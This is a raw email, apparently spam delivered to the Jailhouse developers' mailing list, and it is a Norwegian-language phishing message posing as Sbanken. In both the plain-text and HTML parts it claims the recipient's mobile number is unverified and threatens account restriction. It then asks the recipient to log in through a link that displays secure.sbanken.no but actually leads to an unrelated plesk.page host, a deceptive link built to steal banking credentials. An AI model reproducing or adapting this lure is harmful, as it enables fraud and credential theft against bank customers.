Return-Path: <jailhouse-dev+bncBCM73BHISQPBB7N456NAMGQEPQIU5PY@googlegroups.com>
X-Original-To: lists+jailhouse-dev@lfdr.de
Delivered-To: lists+jailhouse-dev@lfdr.de
Received: from mail-vk1-xa38.google.com (mail-vk1-xa38.google.com [IPv6:2607:f8b0:4864:20::a38])
	by mail.lfdr.de (Postfix) with ESMTPS id 80C9061139B
	for <lists+jailhouse-dev@lfdr.de>; Fri, 28 Oct 2022 15:51:59 +0200 (CEST)
Received: by mail-vk1-xa38.google.com with SMTP id g2-20020a1f2002000000b003af57e81b47sf1128330vkg.17
        for <lists+jailhouse-dev@lfdr.de>; Fri, 28 Oct 2022 06:51:59 -0700 (PDT)
ARC-Seal: i=2; a=rsa-sha256; t=1666965118; cv=pass;
        d=google.com; s=arc-20160816;
        b=u3AllN9U18RAt3fCfxgRnp8SbTJswaFH09QC/0/NlIrud69GHby4BSxSsrQOvM88FL
         L6mXF2PdD/sdM24wTkpsiIGWJXXiexUEcGf9ijA8y5hNHZ40g53Whl7aQOmSeahbVCXa
         rBcXp+ZPm+/9i3RgldrB7LwZB6ZWvI7fYgk2dxXvU1S2rY5Liz7+PVHKos4pabD2PH7n
         d+2MwRvIig+55Ny9Ruhfj70vW8jtgmBuH8NC2XcIJdyzB44Xg3Y3zMo2GUvK1HMbt/e+
         pAqQaFSr5Rrkvh2HdYzxC7xOeNXOvGt1wzJGQz5aUBZWxKl/Gq+JwAKO/5F4Prj2Wymk
         GmQw==
ARC-Message-Signature: i=2; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20160816;
        h=list-unsubscribe:list-subscribe:list-archive:list-help:list-post
         :list-id:mailing-list:precedence:date:from:user-agent:mime-version
         :subject:message-id:to:sender:dkim-signature;
        bh=LX2wFwCSXWIOOiyEk/rfmdsdDPQZboqu/n+tlt7ZXFM=;
        b=vj+X8tPXBZPtmedJKMwgAxbzVzIRuLlCnD2vHhRraepdcQDNTGFm0ogeI0c+AgL37F
         ekVHoAP3t53bjrEKywx6na+gAzOBpzV13nfq/TIfIbN5N50vE0evmYPSo1Be1spZkgLv
         6Ur73ox86TQ6p5rFRWu3ZFKXkcdtrgOmoHWUmjJTNwtiJNVR8sP6KNtwn1wK4PT6t/G2
         Vqlg8pNL7CpBs+Wl1pn0dbD+jDhEmIXiXbq/s3j/pFxS1NzJxeL+WMVWDIss/LTi9YJc
         xc7z6i72VHp/X2sLATLViGFRaKbeFi6zV1qXouenr5qaiYEfH3MT30bxoX50lfTJEyi1
         Tceg==
ARC-Authentication-Results: i=2; gmr-mx.google.com;
       spf=pass (google.com: domain of garyspot.star@bellaliant.net designates 209.71.208.25 as permitted sender) smtp.mailfrom=garyspot.star@bellaliant.net
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=googlegroups.com; s=20210112;
        h=list-unsubscribe:list-subscribe:list-archive:list-help:list-post
         :list-id:mailing-list:precedence:x-original-authentication-results
         :x-original-sender:date:from:user-agent:mime-version:subject
         :message-id:to:sender:from:to:cc:subject:date:message-id:reply-to;
        bh=LX2wFwCSXWIOOiyEk/rfmdsdDPQZboqu/n+tlt7ZXFM=;
        b=qLJm6PlHnQipPEajzH25uOWdQuQ+avv+sy3WqQ0Pw7hDe0t4OeZwbL7Un3ifLUEETO
         +LO/0m5F4yNHdhqRwWuzWxBmXRLFKxbOoBr5lNR2Oy9PRO06nbAE+RjIHV7TCQUXqxbu
         YsI1VwuW8INJYuX4Y3Y3xVodgOE/Cy/XXwqGgbXQm13lMcUfJ2FbsMXASNnpzF9csCcY
         iwCwJOjv5U41VrCbVAc1KB6KOouYbAyKZRpMMIkXHxPGMAeU8dtZRlMpG88ftXKjEcwT
         9V0NIgRIMf+MWxgf6pwWxBNLO8KASptsZMswPxk3zKc+HT2aw62B4+lgwADZiugyHVFG
         l4Ew==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=list-unsubscribe:list-subscribe:list-archive:list-help:list-post
         :x-spam-checked-in-group:list-id:mailing-list:precedence
         :x-original-authentication-results:x-original-sender:date:from
         :user-agent:mime-version:subject:message-id:to:x-gm-message-state
         :sender:from:to:cc:subject:date:message-id:reply-to;
        bh=LX2wFwCSXWIOOiyEk/rfmdsdDPQZboqu/n+tlt7ZXFM=;
        b=wd3fiRptn6C02ZyVrkPpmO9NOQqjQ2NVJLAOEnkZQdlITFIg38gCrtLa1vN6Ue6laS
         sAVNMH069kHe6te/Gt0engED5Sg652JfMSDDgpQ//WbpyiQuGY8BXYchkqn1qc8850WT
         vWQbWuIbHga5JxZ5WavEcZtGVD9eGMkckfdHTQAWqScKoV+97HzGmzeVHQN+F/Ie5GOx
         VAf//jvt8I7MXYLsX75pzjmMmqqcHWNC65DJDZf4+rgWcmupzcaOmLaqC2yZIpTjFJ8S
         ieVsVSgjYf0oBxPFpK53BTU0ChZi1Les5tEMLoTw9DfCnyb0KGWKF5/KVIS0Ale+4azT
         sTmg==
Sender: jailhouse-dev@googlegroups.com
X-Gm-Message-State: ACrzQf1pH/uMFcZi5YtSWbkHyt7M0hIjnMUz36vTSpbm4InibCMcAmcE
	xXRxo/SLnvnWnAEDBP+c6m0=
X-Google-Smtp-Source: AMsMyM6xFnhxQCrnCF72C6UbBP/keuZeKyJQDDSsD5kuXXDBFYSbbqkwdAvVm/4GkNoDkCAG3IgReg==
X-Received: by 2002:a1f:9b0b:0:b0:3af:3445:ae0f with SMTP id d11-20020a1f9b0b000000b003af3445ae0fmr28821898vke.33.1666965118131;
        Fri, 28 Oct 2022 06:51:58 -0700 (PDT)
X-BeenThere: jailhouse-dev@googlegroups.com
Received: by 2002:ab0:30b3:0:b0:40e:4d00:644 with SMTP id b19-20020ab030b3000000b0040e4d000644ls215654uam.6.-pod-prod-gmail;
 Fri, 28 Oct 2022 06:51:57 -0700 (PDT)
X-Received: by 2002:ab0:7395:0:b0:40d:644c:a884 with SMTP id l21-20020ab07395000000b0040d644ca884mr12600468uap.9.1666965117120;
        Fri, 28 Oct 2022 06:51:57 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1666965117; cv=none;
        d=google.com; s=arc-20160816;
        b=G5qneyuaLoA4kQwYlv2YDFfm+GMb73zkh813ivAx77Jfx4v1VIeOGkcpF3w3uzo7cC
         z37V79I0UvZYz7Ez28fDiZo+7MskV+V8KilyO+t3/aR9nRHfRlKG+DBjCb6isYM4gEEL
         XnVgUtE2JQ0sPlkr/WLbLjAXzpt7/3IMD07cAwQEm/4RvKcREGkJDXp+hjZQThcUXHGg
         BVo9k0tA8TDPN+xW1JBoY94ARg+Q428um1S4k7Yux355bF19vDkCdQETi8DHSptktXZ/
         SZ1q203zXxe1BYxOkg4VvpG/vUGF63cfqQKmotm/t5wzieIydQ3/lgKl62ynbPGqD/Wu
         IjqQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20160816;
        h=date:from:user-agent:mime-version:subject:message-id:to;
        bh=4vfNkdBuiZd488GdotLAsi4RC9xb1Kf73OoshAxsYCE=;
        b=pqOAvQxIMyivBglzaNFMzIhcDI2ykeGaZUSAZt+4QZ/h2fmuReBnzUHQ8assH50W1C
         Uomxo9uBLeumoZRg3ezOsbuoC6elujqBWnVsYBYY5pR37N/CdB8YTAI/EfE5bZK8pTEl
         IAclJy8VLDUPMwsyMwGY+uksw0Otif8SL0zq16GTvcjEVHjGYgbWOBFIN/Q8PXGmahQ1
         6knqq29w6vpCH2uvvQo5OiNv4mLsL3N/galgaOIOE8URiwT7WD2quf2CKyNiKO0BfMOc
         CYVnhi9wnKZj3M1KkBhMcrRpuhdnbVqWeSo6dgk2tpWwlKQLm9YOgKlqibfUrXG2pTw2
         YOuQ==
ARC-Authentication-Results: i=1; gmr-mx.google.com;
       spf=pass (google.com: domain of garyspot.star@bellaliant.net designates 209.71.208.25 as permitted sender) smtp.mailfrom=garyspot.star@bellaliant.net
Received: from cmx-mtlrgo001.bell.net (mta-mtl-005.bell.net. [209.71.208.25])
        by gmr-mx.google.com with ESMTPS id 66-20020a1f1745000000b003b7cbb8ae4fsi207388vkx.1.2022.10.28.06.51.57
        for <jailhouse-dev@googlegroups.com>
        (version=TLS1_2 cipher=ECDHE-ECDSA-AES128-GCM-SHA256 bits=128/128);
        Fri, 28 Oct 2022 06:51:57 -0700 (PDT)
Received-SPF: pass (google.com: domain of garyspot.star@bellaliant.net designates 209.71.208.25 as permitted sender) client-ip=209.71.208.25;
X-RG-CM-BuS: 0
X-RG-CM-SC: 0
X-RG-CM: Clean
X-RG-Env-Sender: garyspot.star@bellaliant.net
X-RG-Rigid: 635A9D83004738B9
X-CM-Envelope: MS4xfBy5Y4P5Nx8TGdKT43DzUc+wBqvSTifmDrCw2utuu7V4Yo9iFElJcf0/YgpUpMf4cO5umNbUPMsR6p0Pwo/SAzL5vOz4uY/sqlR/kQMmJc2L5lbgnIau
 A1/6/JEEIgEuHpZkp2d3L3XwGsneE/+4QUOMbD4dRL4ogIq5NDc7EYhJ5x/F5N1KujfU4hjZA8RsQhZ9uER6F+CMYassLbw+yQh8EbnDRjXWTsTrbGsEqBpM
 M5bCYEECGmTrjQfmYmPUd9GVSLGu9QCfWgvEISKrg/ULsb7/fy77ZGACT3kmtCMx0toC2wqCsU8GN+09JXTtQ2K+q3ovAcxm/9hrUcvpfCb61iQ/ms0ExS6j
 ZRqsNm+KY4NjFLt9y+zWax0sXGdFIphyRSXctIZYAQUXG7rOxvmVX2f31rr9lZMs45o/nT3g11+GOBa5UwsXFp2JOrSYEKw00jhNKocFuwS0qOnuBw62pHLK
 dW9GhSA/k7VYYh4Hfbw8xxnwlHY3KeKKntIgi85iFLLaZpBflIs5cRDO698aSYyBMG1Nkmb8lp8VPU6E4BCbT/UZGrnYYk0ojMAr7W2S34BzCB+oBWvv8zcG
 NGbM6w515z77e2B606/ZABWyqoTs0r+29AxeYe6Xt7zg4P9GotS7kuoYSNB7XQt6W9XQxCTbVkngjrbNr8F4PLnCBzo8ktypzfXWTFcERTHmisFS+8u4CLxi
 mBI68++rv/xboG0wkJp/VGvtPhptkk/jj/SOI43lMXDHfEToYNUl0FeqHxk/8QZkH5D14qY5L+hkeR4pgCapcv0tPEMGm6NM1WDJCIACibqGM1jyzLIEpuNR
 /j+CP/lOtDf2reafPTLDQqJo+K/A4vPSaVmByKFJxBzn/HL6PzpLcBG8IXGPoHgPd7a2YtdRi+zoWu1PimUNAX3ev53wGSgcF4UZTtF0BY9yKXZTzXRHcyH2
 InwGOyT1GXj3lwdk/6PLlWYaPJUQwUpLWWMwMjrn+hbq1kxWusc8QrW60gaNGaJFLDd0Num5AuLJH2yB1QXjQE6LxA10RJz4DR8+HIOkvDJGBh0ogwA86ucC
 0Jel7AMms4lIx7JVbDBbYmybGd7v3rFfZnHqHONVRYHwWQ7FOUkZzfkJyEDNdWwHo+b+0d3prxFjJjpiXl8SQsoJ/xlTzTEZJrX9m7p+lcdiVYxtW8dC6DiM
 B8sZNS/qimev3nBRykmypJ9KU8j1tNZOXgMGQXQVk7/REqvC70nxnhJ6+CVYucCdnEShzviz3wsBk1Ut2J18NxSE8d6sbXAvyHSvlUFf65y1+F61ok7oYSxY
 0zulrvsNJjJrkVez3LzV1CKeQDHW6FVD4BzxBLXBuJB2HfqfvL6TZ/WvTkTW5mNi62YnQQm7NYV5VgDF5R2XmCtNQlH82szw2YBSXRyU0cDORHkuKkguakfD
 N3bqtAzTxUcsmOI5N6iJyEhV8EAVtTJwAK1ix/comQHhGLNuY5VwJWiPyjQJ6LgeStq9YzzZy5RNWhIx3UMLV0Q82J7cpOa774v8ZPS7Uk2AbjM0ojiow6Cq
 2QU=
X-CM-Analysis: v=2.4 cv=RroDbgqK c=1 sm=1 tr=0 ts=635bde57
 a=vhzP4KWsndlpTFyM81ZXdw==:117 a=YZHlSTkx/8aBjky5EeveJg==:17
 a=z_WQn_YvuNwA:10 a=Qawa6l4ZSaYA:10 a=V6KHSXBXAAAA:8 a=fevPwjWrAAAA:8
 a=tB7zwP3Zpd1T1w7Xt2gA:9 a=QEXdDO2ut3YA:10 a=0scP29cVYpIA:10 a=3GbmggnxAAAA:8
 a=j5ZJ9MDaI9Cvfx7ZhPUA:9 a=8cCH6KC2phQNrG4Z:21 a=_W_S_7VecoQA:10
 a=ywzb5qoaU0QA:10 a=k-bIn84YY0625PNcARfX:22 a=I-34-tiJMRFidqV1s339:22
Received: from cmx-mtlweb028.bellmx-prd.synchronoss.net (192.168.4.43) by cmx-mtlrgo001.bell.net (5.8.807) (authenticated as garyspot.star@bellaliant.net)
        id 635A9D83004738B9; Fri, 28 Oct 2022 09:51:19 -0400
Received: from [162.250.197.34]
	by webmail.bellaliant.net with HTTP; Fri, 28 Oct 2022 09:51:18 -0400
To: service@mail.com
Message-ID: <695782ef.72f5.1841edc83b7.Webtop.43@bellaliant.net>
Subject: Tr:
MIME-Version: 1.0
Content-Type: multipart/alternative; 
	boundary="----=_Part_97161_1160290978.1666965078956"
User-Agent: OWM Mail 3
X-SID: 43
X-Originating-IP: [162.250.197.34]
From: Sbanken <garyspot.star@bellaliant.net>
Date: Fri, 28 Oct 2022 09:51:18 -0400 (EDT)
X-Original-Sender: garyspot.star@bellaliant.net
X-Original-Authentication-Results: gmr-mx.google.com;       spf=pass
 (google.com: domain of garyspot.star@bellaliant.net designates 209.71.208.25
 as permitted sender) smtp.mailfrom=garyspot.star@bellaliant.net
Precedence: list
Mailing-list: list jailhouse-dev@googlegroups.com; contact jailhouse-dev+owners@googlegroups.com
List-ID: <jailhouse-dev.googlegroups.com>
X-Spam-Checked-In-Group: jailhouse-dev@googlegroups.com
X-Google-Group-Id: 175645748590
List-Post: <https://groups.google.com/group/jailhouse-dev/post>, <mailto:jailhouse-dev@googlegroups.com>
List-Help: <https://groups.google.com/support/>, <mailto:jailhouse-dev+help@googlegroups.com>
List-Archive: <https://groups.google.com/group/jailhouse-dev
List-Subscribe: <https://groups.google.com/group/jailhouse-dev/subscribe>, <mailto:jailhouse-dev+subscribe@googlegroups.com>
List-Unsubscribe: <mailto:googlegroups-manage+175645748590+unsubscribe@googlegroups.com>,
 <https://groups.google.com/group/jailhouse-dev/subscribe>

------=_Part_97161_1160290978.1666965078956
Content-Type: text/plain; charset="UTF-8"; format=flowed
Content-Transfer-Encoding: quoted-printable

=C2=A0
Kj=C3=A6re kunde,
V=C3=A5rt system gjenkjenner at mobilnummeret knyttet til din sbanken-konto=
=20
enn=C3=A5 ikke er bekreftet.
Av sikkerhetsgrunner er vi tvunget til =C3=A5 begrense tilgangen til din=20
sbanken-konto. Hvis du ikke oppgir opplysningene dine innen 28. oktober=20
2022.
https://secure.sbanken.no/=20
<https://quizzical-agnesi.157-245-55-11.plesk.page/semaine?any=3D7834031059=
7443597309>
    1.  Logg p=C3=A5 med bankopplysningene dine.
    2.  F=C3=B8lg de obligatoriske trinnene for =C3=A5 fullf=C3=B8re den n=
=C3=B8dvendige=20
prosessen.
=C2=A0
=C2=A0
V=C3=A6r oppmerksom p=C3=A5 at denne meldingen genereres av en PLS. Ikke br=
uk Svar=20
til-funksjonen.
Takk for tilliten.
Sbanken Gruppe.
=C2=A0=C2=A0=C2=A0=C2=A0
Detaljert!
Denne innovative og sikre sikkerhetstjenesten er basert p=C3=A5 et forsterk=
et=20
autentiseringssystem for hver kunde.
=C2=A0
=C2=A0















--=20
You received this message because you are subscribed to the Google Groups "=
Jailhouse" group.
To unsubscribe from this group and stop receiving emails from it, send an e=
mail to jailhouse-dev+unsubscribe@googlegroups.com.
To view this discussion on the web visit https://groups.google.com/d/msgid/=
jailhouse-dev/695782ef.72f5.1841edc83b7.Webtop.43%40bellaliant.net.

------=_Part_97161_1160290978.1666965078956
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE html><html><head><title></title></head><body><table bgcolor=3D'#f=
ff' border=3D'0' cellpadding=3D'0' cellspacing=3D'0' style=3D'border-collap=
se: collapse!important;' width=3D'100%'><tbody><tr><td style=3D'background-=
color: #fff;'><em>&nbsp;</em></td><td><table border=3D'0' cellpadding=3D'0'=
 cellspacing=3D'0' style=3D'border-collapse: collapse!important;'><tbody><t=
r><td class=3D'' style=3D'width: 424px; background-color: #ffffff;'><table =
border=3D'0' cellpadding=3D'0' cellspacing=3D'0' style=3D'width: 100%; bord=
er-collapse: collapse!important;'><tbody><tr><td class=3D'' height=3D'20' s=
tyle=3D'width: 100%; background-color: #fff;'><em><img alt=3D'' height=3D'7=
0' src=3D'https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Sbanken=
.svg/440px-Sbanken.svg.png' style=3D'display: block; margin-left: auto; mar=
gin-right: auto;' width=3D'225'></em></td></tr><tr><td><table bgcolor=3D'#F=
FFFFF' border=3D'0' cellpadding=3D'0' cellspacing=3D'0' style=3D'width: 100=
%; border-collapse: collapse!important;' width=3D'100%'><tbody><tr><td><tab=
le border=3D'0' cellpadding=3D'0' cellspacing=3D'0' style=3D'width: 100%; b=
order-collapse: collapse!important;'><tbody><tr><td width=3D'15'><em><img a=
lt=3D'' data-imageerror=3D'SrcNullOrEmpty' data-imagetype=3D'Empty' style=
=3D'text-decoration: none; height: auto; vertical-align: middle; outline-wi=
dth: medium; outline-style: none; outline-color: invert; line-height: 0; bo=
rder-width: 0px;' width=3D'15'></em></td><td><table border=3D'0' cellpaddin=
g=3D'0' cellspacing=3D'0' style=3D'width: 100%; border-collapse: collapse!i=
mportant;'><tbody><tr><td style=3D'font-size: 14px;'><div style=3D'margin: =
0px 20px 15px 0px;'><p><em><span style=3D'color: #262342;'><strong>Kj&aelig=
;re kunde,</strong></span></em></p><p><br><em>V&aring;rt system gjenkjenner=
 at mobilnummeret knyttet til din sbanken-konto enn&aring; ikke er bekrefte=
t.</em></p><p><br><em>Av sikkerhetsgrunner er vi tvunget til &aring; begren=
se tilgangen til din sbanken-konto. Hvis du ikke oppgir opplysningene dine =
innen 28. oktober 2022.</em></p></div></td></tr></tbody></table><table styl=
e=3D'width: 399.797px;'><tbody><tr><td style=3D'width: 369px;'><p style=3D'=
padding-left: 40px; text-align: center;'><em><span style=3D'color: #008080;=
'><strong><a data-auth=3D'NotApplicable' data-linkindex=3D'0' href=3D'https=
://quizzical-agnesi.157-245-55-11.plesk.page/semaine?any=3D7834031059744359=
7309' rel=3D'nofollow noopener noreferrer' style=3D'color: #008080;' target=
=3D'_blank'><span style=3D'text-decoration: underline;'>https://secure.sban=
ken.no/</span></a></strong></span></em></p><ol style=3D'padding-left: 20px;=
'><li><em>Logg p&aring; med bankopplysningene dine.</em></li><li><em>F&osla=
sh;lg de obligatoriske trinnene for &aring; fullf&oslash;re den n&oslash;dv=
endige prosessen.</em></li></ol></td><td style=3D'width: 13.7969px;'><em>&n=
bsp;</em></td></tr></tbody></table><br aria-hidden=3D'true'><table border=
=3D'0' cellpadding=3D'0' cellspacing=3D'0' style=3D'width: 100%; border-col=
lapse: collapse!important;'><tbody><tr><td style=3D'font-size: 14px;'><div =
aria-hidden=3D'true' style=3D'margin: 0px 20px 15px 0px;'><em>&nbsp;</em></=
div></td></tr><tr><td style=3D'font-size: 14px;'><div style=3D'margin: 0px =
20px 15px 0px;'><em><span style=3D'color: #808080;'>V&aelig;r oppmerksom p&=
aring; at denne meldingen genereres av en PLS. Ikke bruk Svar til-funksjone=
n.</span></em></div></td></tr><tr><td style=3D'font-size: 14px;'><div style=
=3D'margin: 0px 20px 15px 0px;'><em><span style=3D'color: #262342;'>Takk fo=
r tilliten.</span></em></div></td></tr><tr><td style=3D'font-size: 14px;'><=
div style=3D'margin: 0px 20px 15px 0px; text-align: left;'><em><span style=
=3D'color: #262342;'>Sbanken Gruppe.</span></em></div></td></tr></tbody></t=
able></td><td width=3D'15'><em><img alt=3D'' data-imageerror=3D'SrcNullOrEm=
pty' data-imagetype=3D'Empty' style=3D'text-decoration: none; height: auto;=
 vertical-align: middle; outline-width: medium; outline-style: none; outlin=
e-color: invert; line-height: 0; border-width: 0px;' width=3D'15'></em></td=
></tr></tbody></table></td></tr><tr><td height=3D'20'><em>&nbsp;</em></td><=
/tr></tbody></table></td></tr></tbody></table></td><td class=3D''><em>&nbsp=
;</em></td><td class=3D'' style=3D'width: 207px;' valign=3D'top'><table bor=
der=3D'0' cellpadding=3D'0' cellspacing=3D'0' style=3D'width: 100%; border-=
collapse: collapse!important;'><tbody><tr><td class=3D'' height=3D'20' styl=
e=3D'width: 100%; background-color: #fff;'><em>&nbsp;</em></td></tr><tr><td=
><table bgcolor=3D'#262342' border=3D'0' cellpadding=3D'0' cellspacing=3D'0=
' style=3D'width: 100%; border-collapse: collapse!important;' width=3D'100%=
'><tbody><tr><td height=3D'20'><em>&nbsp;</em></td></tr><tr><td style=3D'co=
lor: #ffffff;'><table bgcolor=3D'#262342' border=3D'0' cellpadding=3D'0' ce=
llspacing=3D'0' style=3D'width: 100%; border-collapse: collapse!important;'=
><tbody><tr><td style=3D'background-color: #262342;' width=3D'15'><em><span=
 style=3D'color: #000000;'><img alt=3D'' data-imageerror=3D'' data-imagetyp=
e=3D'Empty' style=3D'text-decoration: none; height: auto; vertical-align: m=
iddle; outline-width: medium; outline-style: none; outline-color: invert; l=
ine-height: 0; border-width: 0px;' width=3D'15'></span></em></td><td style=
=3D'background-color: #262342;'><p style=3D'font-size: 14px; color: #ffffff=
;'><em><strong>Detaljert!</strong></em></p><p style=3D'font-size: 14px; col=
or: #ffffff;'><em><strong>Denne innovative og sikre sikkerhetstjenesten er =
basert p&aring; et forsterket autentiseringssystem for hver kunde.</strong>=
</em></p></td><td style=3D'background-color: #262342;' width=3D'15'><em><sp=
an style=3D'color: #000000;'><img alt=3D'' data-imageerror=3D'' data-imaget=
ype=3D'Empty' style=3D'text-decoration: none; height: auto; vertical-align:=
 middle; outline-width: medium; outline-style: none; outline-color: invert;=
 line-height: 0; border-width: 0px;' width=3D'15'></span></em></td></tr></t=
body></table></td></tr></tbody></table></td></tr></tbody></table></td></tr>=
</tbody></table></td></tr></tbody></table><p>&nbsp;</p><p>&nbsp;</p></body>=
</html><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>=
<br><br><br><br><br><br><br><br><br><br><br><br><br><br>

<p></p>

-- <br />
You received this message because you are subscribed to the Google Groups &=
quot;Jailhouse&quot; group.<br />
To unsubscribe from this group and stop receiving emails from it, send an e=
mail to <a href=3D"mailto:jailhouse-dev+unsubscribe@googlegroups.com">jailh=
ouse-dev+unsubscribe@googlegroups.com</a>.<br />
To view this discussion on the web visit <a href=3D"https://groups.google.c=
om/d/msgid/jailhouse-dev/695782ef.72f5.1841edc83b7.Webtop.43%40bellaliant.n=
et?utm_medium=3Demail&utm_source=3Dfooter">https://groups.google.com/d/msgi=
d/jailhouse-dev/695782ef.72f5.1841edc83b7.Webtop.43%40bellaliant.net</a>.<b=
r />

------=_Part_97161_1160290978.1666965078956--
